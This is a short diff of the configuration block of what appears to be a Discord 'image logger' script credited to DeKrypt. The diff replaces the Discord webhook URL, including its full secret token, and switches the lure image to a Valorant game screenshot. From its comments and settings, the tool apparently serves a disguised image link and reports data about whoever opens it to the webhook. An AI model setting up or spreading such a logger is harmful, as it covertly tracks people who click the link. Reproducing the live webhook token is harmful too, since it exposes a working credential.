@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1347172245671251969/9hi4SkScNajNyOAUAVIHKk5XK7ocjgz96R7KHWH5HWGR8cUYFVQOZj8-LZJ3933VtvTK",
-    "image": "https://static-cdn.jtvnw.net/twitch-clips/26MvEcQLN26oVimwUxoIVg/AT-cm%7C26MvEcQLN26oVimwUxoIVg-preview-480x272.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1348382400270569502/Sd5nLrKoUEpA8Gadjf_yLUsRlOItHqW9BPZytx9kao5or5cELfQRbXki7wgG-V_Q-Z3W",
+    "image": "https://images.squarespace-cdn.com/content/v1/59af2189c534a58c97bd63b3/1591631087230-6PRTBZHDLWLC1VP53FVL/Spike+plant+wall+Site+A+Ascent+Sage+Valorant.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
